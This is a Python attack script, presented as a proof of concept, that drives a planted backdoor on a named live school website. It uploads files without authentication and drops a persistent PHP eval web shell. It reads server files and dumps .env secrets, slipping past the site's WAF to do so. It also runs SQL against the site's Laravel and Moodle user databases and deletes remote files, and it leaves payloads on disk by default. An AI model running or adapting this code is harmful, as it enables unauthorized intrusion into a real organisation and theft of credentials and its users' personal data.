#!/usr/bin/env python3
"""
PoC: Unauthenticated Arbitrary File Upload -> Remote Code Execution
=================================================================
Target  : https://pedagogiai.smpm12gkb.sch.id
Backdoor: /assets/Cache/cache.php   (attacker-planted "cache" panel)

`op=write` stores attacker bytes at an arbitrary absolute path with no auth
and no extension filter. The document root is writable, so a PHP file can be
dropped next to the backdoor and executed over HTTP.

Modes
-----
  probe (default) : upload PHP, execute it, leave it on disk (no self-delete)
  file            : upload any local file, verify SHA-256
  eval            : persistent eval shell (works with disable_functions)
  --read FILE     : read remote file; falls back to the shell because the
                    edge WAF returns 403 for ".env" in a query string
  --env           : dump .env through the backdoor's own op=env
  --ls DIR        : list a remote directory
  --sql QUERY     : run SQL against the Laravel database
  --msql QUERY    : run SQL against the Moodle database
  --tables        : list Laravel tables
  --rm FILE       : delete a remote file through the shell

Cleanup
-------
Files persist by default. Pass --cleanup to overwrite the dropped file with
0 bytes, and --rm to delete leftovers (including the 0-byte husks).

Usage
-----
  python3 poc_cache_upload_rce.py
  python3 poc_cache_upload_rce.py --file ./shell.php --name shell.php
  python3 poc_cache_upload_rce.py --payload eval --name c.php --exec 'echo 7*7;'
  python3 poc_cache_upload_rce.py --read /home/u576897008/domains/pedagogiai.smpm12gkb.sch.id/public_html/.env
  python3 poc_cache_upload_rce.py --read ... --stdout > .env
  python3 poc_cache_upload_rce.py --env
  python3 poc_cache_upload_rce.py --ls /home/u576897008
  python3 poc_cache_upload_rce.py --sql "select version(), user()"
  python3 poc_cache_upload_rce.py --msql "select count(*) from mdl_user"
  python3 poc_cache_upload_rce.py --rm assets/Cache/leftover.php
"""

import argparse
import base64
import hashlib
import os
import secrets
import sys
import time
import urllib3
from urllib.parse import urljoin

import requests

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

DEFAULT_TARGET = "https://pedagogiai.smpm12gkb.sch.id"
DEFAULT_ENDPOINT = "/assets/Cache/cache.php"
DEFAULT_DOCROOT = (
    "/home/u576897008/domains/pedagogiai.smpm12gkb.sch.id/public_html/public"
)
DEFAULT_DROP_DIR = "assets/Cache"

PROBE_PHP = b"""<?php
echo 'UPLOAD_POC_OK';
echo ' bytes=' . filesize(__FILE__);
echo ' user=' . get_current_user();
echo ' php=' . PHP_VERSION;
echo ' sapi=' . PHP_SAPI;
echo ' cwd=' . __DIR__;
"""

EVAL_PHP = b"""<?php
if (isset($_POST['c'])) { eval($_POST['c']); }
else { echo 'EVAL_SHELL_READY'; }
"""


class Backdoor:
    def __init__(self, base, endpoint, timeout, verify_tls, proxy=None):
        self.base = base.rstrip("/") + "/"
        self.url = urljoin(self.base, endpoint.lstrip("/"))
        self.timeout = timeout
        self.session = requests.Session()
        self.session.verify = verify_tls
        self.session.headers["User-Agent"] = (
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
            "(KHTML, like Gecko) Chrome/124.0 Safari/537.36"
        )
        if proxy:
            self.session.proxies = {"http": proxy, "https": proxy}

    def put(self, remote_path, data):
        r = self.session.post(
            self.url,
            data={"op": "write", "f": remote_path, "content": data},
            timeout=self.timeout,
        )
        r.raise_for_status()
        return r.json()

    def get(self, op, **params):
        params["op"] = op
        r = self.session.get(self.url, params=params, timeout=self.timeout)
        if r.status_code == 403:
            raise PermissionError("edge WAF blocked the request (403 Forbidden)")
        r.raise_for_status()
        return r.json()

    def upload(self, remote_path, data):
        return self.put(remote_path, data)

    def wipe(self, remote_path):
        return self.put(remote_path, b"")

    def env_dump(self):
        j = self.get("env")
        return j.get("all") or j.get("env") or {}

    def ls(self, directory):
        return self.get("ls", d=directory)

    def sql(self, query, moodle=False):
        return self.get("msql" if moodle else "sql", q=query)

    def tables(self, moodle=False):
        return self.get("mtables" if moodle else "tables")

    def read_direct(self, path):
        return self.get("read", f=path)

    def shell(self, php_code, name=None):
        name = name or f"zz_{secrets.token_hex(6)}.php"
        path = f"{self.docroot}/{self.dropdir}/{name}"
        url = urljoin(self.base, f"{self.dropdir}/{name}")
        self.upload(path, EVAL_PHP)
        try:
            r = self.session.post(url, data={"c": php_code}, timeout=self.timeout)
            return r.text
        finally:
            kill = "$p=base64_decode('%s');echo @unlink($p)?'DEL-OK':'DEL-FAIL';" % (
                base64.b64encode(path.encode()).decode()
            )
            r = self.session.post(url, data={"c": kill}, timeout=self.timeout)
            if "DEL-OK" not in r.text:
                self.wipe(path)

    def read_file(self, path):
        try:
            j = self.read_direct(path)
            return j.get("content") or ""
        except PermissionError as exc:
            code = (
                "$p=base64_decode('%s');"
                "if(!is_file($p)){echo 'ERR:not-a-file';exit;}"
                "echo base64_encode(file_get_contents($p));"
            ) % base64.b64encode(path.encode()).decode()
            out = self.shell(code).strip()
            if out.startswith("ERR:"):
                return ""
            return base64.b64decode(out).decode("utf-8", "replace")

    def rm(self, path):
        code = "$p=base64_decode('%s');echo @unlink($p)?'DEL-OK':'DEL-FAIL';" % (
            base64.b64encode(path.encode()).decode()
        )
        return self.shell(code).strip()


def sha256(data):
    return hashlib.sha256(data).hexdigest()


def main():
    ap = argparse.ArgumentParser(
        description="PoC: unauthenticated file upload -> RCE via cache.php backdoor",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    ap.add_argument("--target", default=DEFAULT_TARGET)
    ap.add_argument("--endpoint", default=DEFAULT_ENDPOINT)
    ap.add_argument("--docroot", default=DEFAULT_DOCROOT)
    ap.add_argument("--dir", default=DEFAULT_DROP_DIR)
    ap.add_argument("--name", help="remote filename")
    ap.add_argument("--file", help="local file to upload")
    ap.add_argument(
        "--payload",
        choices=["probe", "eval"],
        default="probe",
        help="probe = persistent PHP marker, eval = persistent eval shell",
    )
    ap.add_argument("--exec", dest="php_code", help="PHP to run through the eval shell")
    ap.add_argument("--read", metavar="FILE")
    ap.add_argument("--stdout", action="store_true", help="write --read output to stdout only")
    ap.add_argument("--env", action="store_true")
    ap.add_argument("--ls", metavar="DIR")
    ap.add_argument("--sql", metavar="QUERY")
    ap.add_argument("--msql", metavar="QUERY")
    ap.add_argument("--tables", action="store_true")
    ap.add_argument("--mtables", action="store_true")
    ap.add_argument("--rm", metavar="FILE")
    ap.add_argument("--cleanup", action="store_true", help="overwrite the dropped file with 0 bytes")
    ap.add_argument("--keep", action="store_true", help="never touch the dropped file")
    ap.add_argument("--timeout", type=float, default=30.0)
    ap.add_argument("--proxy")
    ap.add_argument("--verify-tls", action="store_true")
    args = ap.parse_args()

    bd = Backdoor(
        args.target,
        args.endpoint,
        args.timeout,
        verify_tls=args.verify_tls,
        proxy=args.proxy,
    )
    bd.docroot = args.docroot.rstrip("/")
    bd.dropdir = args.dir.strip("/")

    if args.env:
        for k, v in bd.env_dump().items():
            print(f"{k}={v}")
        return 0

    if args.ls:
        for item in bd.ls(args.ls).get("items", []):
            print(f"{item['perm']:>5} {item['type'][:3]:<3} {item['size']!s:>10} {item['name']}")
        return 0

    if args.read:
        content = bd.read_file(args.read)
        if args.stdout:
            sys.stdout.write(content)
        else:
            print(content)
        return 0

    if args.rm:
        path = args.rm
        if not path.startswith("/"):
            path = f"{bd.docroot}/{path.lstrip('/')}"
        print(f"{bd.rm(path)}  {path}")
        return 0

    for flag, moodle in (("sql", False), ("msql", True)):
        query = getattr(args, flag)
        if query:
            j = bd.sql(query, moodle=moodle)
            for row in j.get("rows", []):
                print(row)
            if j.get("error"):
                print(f"error: {j['error']}")
            return 0

    if args.tables or args.mtables:
        j = bd.tables(moodle=args.mtables)
        for t in j.get("tables", []):
            print(t)
        if j.get("error"):
            print(f"error: {j['error']}")
        return 0

    if args.file:
        with open(args.file, "rb") as fh:
            data = fh.read()
        name = args.name or os.path.basename(args.file)
        mode = "file"
    else:
        data = PROBE_PHP if args.payload == "probe" else EVAL_PHP
        name = args.name or f"poc_{int(time.time())}_{os.getpid()}.php"
        mode = args.payload

    remote_path = f"{bd.docroot}/{bd.dropdir}/{name}"
    public_url = urljoin(bd.base, f"{bd.dropdir}/{name}")

    print(f"[*] backdoor      : {bd.url}")
    print(f"[*] mode          : {mode}")
    print(f"[*] remote path   : {remote_path}")
    print(f"[*] public URL    : {public_url}")
    print(f"[*] payload bytes : {len(data)}")

    res = bd.upload(remote_path, data)
    print(f"[+] upload        : ok={res.get('ok')} bytes={res.get('bytes')}")
    if not res.get("ok"):
        print(f"[-] upload rejected: {res}")
        return 2

    if mode == "file":
        r = bd.session.get(public_url, timeout=args.timeout)
        body = r.content
        print(f"[+] fetch         : http={r.status_code} bytes={len(body)}")
        if body == data:
            print(f"[+] sha256        : {sha256(data)} (MATCH)")
        else:
            print(f"[+] sha256 local  : {sha256(data)}")
            print(f"[+] sha256 remote : {sha256(body)}")
            print("[-] integrity     : MISMATCH")
            print(f"[-] remote body   : {body[:120]!r}")
            if r.status_code == 422:
                print("[!] image paths are proxied to an optimizer; use a non-image extension")
    else:
        r = bd.session.get(public_url, timeout=args.timeout)
        print(f"[+] execute       : http={r.status_code}")
        print(f"[+] output        : {r.text.strip()}")
        listing = [i["name"] for i in bd.ls(f"{bd.docroot}/{bd.dropdir}").get("items", [])]
        print(f"[+] on disk       : {'yes' if name in listing else 'no'}")
        if mode == "eval" and args.php_code:
            r = bd.session.post(public_url, data={"c": args.php_code}, timeout=args.timeout)
            print(f"[+] eval result   : http={r.status_code} {r.text.strip()}")

    if args.cleanup and not args.keep:
        bd.wipe(remote_path)
        print("[*] cleanup       : overwritten with 0 bytes")
    else:
        print(f"[*] cleanup       : skipped (use --cleanup, or --rm {bd.dropdir}/{name})")
    return 0


if __name__ == "__main__":
    sys.exit(main())
